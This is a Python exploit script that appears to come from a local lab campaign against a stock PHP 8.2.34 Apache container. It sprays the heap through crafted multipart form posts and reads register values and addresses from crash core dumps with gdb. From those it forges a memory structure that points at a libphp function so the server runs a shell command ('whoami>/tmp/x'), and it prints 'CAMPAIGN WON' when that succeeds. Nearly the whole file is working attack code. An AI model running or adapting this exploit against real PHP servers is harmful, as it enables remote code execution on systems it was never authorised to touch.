#!/usr/bin/env python3
"""oom133: WARM-VALUE SEA ARM (names dead for pointers, values are binary-safe).

Laws from oom132 runs:
- rdi = SIG8 tile bytes, phase q=7 (name sea proven: freed temp copies seed tail).
- NAMES truncate at first NUL (nulprobe: POSTNUL never in core) -> a name can
  never carry a full 8B pointer (top 2 bytes 0x00). Names dead as carrier.
- VALUES are binary-safe (multipart). Value len 3056 -> zend_string alloc
  24+3057=3081 -> 3088 chunk = SAME bin as freed ~3064B name temps -> value
  lands exactly on a recycled name-temp chunk inside the tail region.
- Cut ~863 (per boot varies); tag part 830 alive = anchor; window 784..863
  ends at the cut (K-seed law: tail = last parsed parts' chunks).

Design (one boot, heap-clone law):
- m_body: sea parts 784..863 -> name shrunk -3039 (filler 17 K) + value 3056B
  of T16 measure tiles; TAG_PART=830 value = tag8 anchors (1537B, -1536
  shrink). All names K -> census still readable.
- fire measure (crash) -> core: rdi phase q_v (decode vs T16 ring), tag addr A
  -> aim(A) -> B=A+OFF, OFF.
- a_body: SAME geometry, sea value = rotB (B||B rotated by q_v), TAG value =
  oom116 block at OFF. len(a_body)==len(m_body) by construction.
- fire arm want_crash=False; x after EVERY try; early return on X_EXISTS.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8083"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
MAGIC = 0xC0DEBA5E
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
T16 = SIG8 + struct.pack("<Q", 0xDFE2C0DE51E2C0DF)   # 16B period, NUL-free
KEYLEN = P.KEYLEN
K1 = 4200
TAG_PART = 830
SEA_LO, SEA_HI = 784, 864          # ends AT the cut (~863), 80 parts
SEA_VLEN = 3056                    # 191 tiles; same 3088 bin as name temps
SEA_SHRINK = 3055                  # name = 49+1K+3+8 = 61; part 61+3056+2 = 3119 = stock part
VLEN = 1537                        # tag/block value
CORE = "/tmp/core.133"

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def x_state():
    return sh("test -f /tmp/x && echo X_EXISTS:$(cat /tmp/x) || echo NO_X").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8083:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def cell_of(addr):
    return struct.pack("<Q", addr) * 2

def tag8(i):
    return struct.pack("<QQ", MAGIC + i, MAGIC + i)

def rot(tile, q):
    return bytes(tile[(k - q) % 16] for k in range(16))

def name_of(i, shrink=0):
    filler = b"K" * (KEYLEN - 8 - shrink)
    return (b'--BOUND\r\nContent-Disposition: form-data; name="p' + filler
            + b"%d" % i + b'[x]"\r\n\r\n')

def sea_value(tile):
    assert len(tile) == 16 and len(tile) * (SEA_VLEN // 16) == SEA_VLEN
    return tile * (SEA_VLEN // 16)

def tag_value(i, B=None, OFF=0, with_block=False, BASE=None):
    if with_block:
        v = bytearray(cell_of(B) * (VLEN // 16) + b"P")
        st = struct.pack_into
        st("<II", v, OFF + 0x00, 1, 0x108)
        st("<II", v, OFF + 0x08, 1, 0)
        st("<Q", v, OFF + 0x10, 0)
        st("<Q", v, OFF + 0x18, B + 0x68)
        st("<I", v, OFF + 0x2C, 1)
        st("<Q", v, OFF + 0x50, B + 0x90)
        v[OFF + 0x58] = 6
        st("<I", v, OFF + 0x5C, 0x106)
        st("<Q", v, OFF + 0x68, 0)
        st("<Q", v, OFF + 0x70, BASE + ZIF)
        st("<IIQI", v, OFF + 0x90, 1, 0x106, 0, len(CMD))
        v[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
        for s in range(0, len(v) - 15, 16):
            if not (OFF <= s < OFF + 0xB8):
                v[s:s + 16] = cell_of(B)
        return bytes(v)
    return tag8(i) + b"v" * (VLEN - 32) + tag8(i)

def build_post(sea_tile, arm=False, B=None, OFF=0):
    ps = []
    for i in range(K1):
        if SEA_LO <= i < SEA_HI:
            ps.append(name_of(i, shrink=SEA_SHRINK) + sea_value(sea_tile) + b"\r\n")
        elif i == TAG_PART:
            shrink = 1536
            ps.append(name_of(i, shrink=shrink)
                      + tag_value(i, B=B, OFF=OFF, with_block=arm, BASE=BASE) + b"\r\n")
        else:
            ps.append(name_of(i) + b"v\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def fire(tag, body, tries, want_crash):
    c = r = None
    for t in range(tries):
        sh("rm -f /tmp/core /tmp/core.used")
        n0 = segv_count()
        c, r = post_mod(body)
        crashed = False
        for _ in range(10):
            time.sleep(2)
            if segv_count() > n0 or sh("test -f /tmp/core && echo y") == "y":
                crashed = True
                break
        xs = x_state()
        print("%s try%d: http=%s segv+%d core=%s x=%s"
              % (tag, t, c, segv_count() - n0,
                 sh("test -f /tmp/core && echo y") == "y", xs), flush=True)
        if xs.startswith("X_EXISTS"):
            return crashed, c, r, True
        if crashed == want_crash:
            return crashed, c, r, False
    return crashed, c, r, False

def pull_core(dst):
    subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core.tmp"], capture_output=True)
    subprocess.run(["docker", "cp", "/tmp/core.tmp", "phpbuild:" + dst], capture_output=True)
    subprocess.run(["docker", "cp", "phpbuild:" + dst, "/tmp/scan_core"], capture_output=True)

def segs_of(mm):
    e_phoff = struct.unpack_from("<Q", mm, 0x20)[0]
    e_phentsize, e_phnum = struct.unpack_from("<HH", mm, 0x36)
    out = []
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        pt = struct.unpack_from("<I", mm, off)[0]
        po, pv, pa, pf = struct.unpack_from("<QQQQ", mm, off + 8)
        if pt == 1 and pf > 0x10000:
            out.append((pv, po, pf))
    return out

def core_rdi(corepath):
    subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                    'printf "set pagination off\\nset confirm off\\ninfo registers rdi rbx rip\\nquit\\n" > /tmp/g133.gdb'],
                    capture_output=True)
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g133.gdb /tmp/libphp.stock.so %s 2>&1 | grep -E '^rdi|^rbx|^rip'" % corepath],
                       capture_output=True, timeout=240)
    return r.stdout.decode("latin1").strip()

def aim(A):
    for o in range(24, VLEN - 0xB8, 8):
        cand = A + o
        if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
            nb = cand.to_bytes(6, "little")
            if not any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
                return cand, o
    return None, None

def phase_of(rdi_txt, ring):
    m = re.search(r"rdi\s+0x([0-9a-f]+)", rdi_txt)
    if not m:
        return None
    rb = struct.pack("<Q", int(m.group(1), 16))
    return next((i for i in range(16) if ring[i:i + 8] == rb), None)

print("=== oom133: warm-value sea arm ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == STOCK_MD5, "not stock: " + md5
print("md5 ok", flush=True)

for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))
print("shaped segv=%d" % segv_count(), flush=True)
BASE = base_now()
print("base=0x%x" % BASE, flush=True)
print("pre x: %s" % x_state(), flush=True)

m_body = build_post(T16)
a_len_probe = build_post(T16)  # geometry identical by construction
assert len(m_body) == len(a_len_probe)

B = None; OFF = None
for rnd in range(1, 5):
    print("--- r%d (B=%s OFF=%s) ---" % (rnd, B and hex(B), OFF), flush=True)
    if B is None:
        crashed, c, r, won = fire("r%d-meas" % rnd, m_body, tries=4, want_crash=True)
        if won:
            print("!!! CAMPAIGN WON (meas r%d)" % rnd, flush=True)
            break
        if not crashed:
            print("r%d-meas no crash in 4 tries" % rnd, flush=True)
            continue
        pull_core("%s_r%dm" % (CORE, rnd))
        rdi_txt = core_rdi("%s_r%dm" % (CORE, rnd))
        print("r%d-meas gdb: %s" % (rnd, rdi_txt), flush=True)
        q = phase_of(rdi_txt, T16 + T16)
        import mmap
        f = open("/tmp/scan_core", "rb")
        mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
        segs = segs_of(mm)
        m4 = struct.pack("<Q", MAGIC + TAG_PART)
        tag = None; tiles = 0; maxidx = -1
        pat = re.compile(rb"K{2048,}(\d{1,5})\x00")
        for pv, po, pf in segs:
            d = mm[po:po + pf]
            j = d.find(m4)
            if j >= 0 and tag is None:
                tag = pv + j
            tiles += d.count(T16)
            for m in pat.finditer(d):
                idx = int(m.group(1))
                if idx > maxidx and idx < 4200:
                    maxidx = idx
        mm.close(); f.close()
        print("census: maxidx=%d tag=%s tiles=%d phase=%s"
              % (maxidx, tag and hex(tag), tiles, q), flush=True)
        if tag:
            B, OFF = aim(tag)
            print("ARM aim from tag: B=%s OFF=%s" % (B and hex(B), OFF), flush=True)
        if B is None or q is None:
            print("no tag anchor or phase; remeasure next round", flush=True)
            B = None
            continue
        a_body = build_post(rot(cell_of(B), q), arm=True, B=B, OFF=OFF, )
        assert len(a_body) == len(m_body), "envelope drift %d" % (len(a_body) - len(m_body))
        print("a_body ok len=%d" % len(a_body), flush=True)
        crashed, c, r, won = fire("r%d-arm" % rnd, a_body, tries=6, want_crash=False)
        if won:
            print("!!! CAMPAIGN WON (arm r%d): %s" % (rnd, x_state()), flush=True)
            break
        if crashed:
            pull_core("%s_r%da" % (CORE, rnd))
            print("r%d-arm gdb: %s" % (rnd, core_rdi("%s_r%da" % (CORE, rnd))), flush=True)
    else:
        continue
    break

print("final x: %s" % x_state(), flush=True)
print("=== done ===", flush=True)
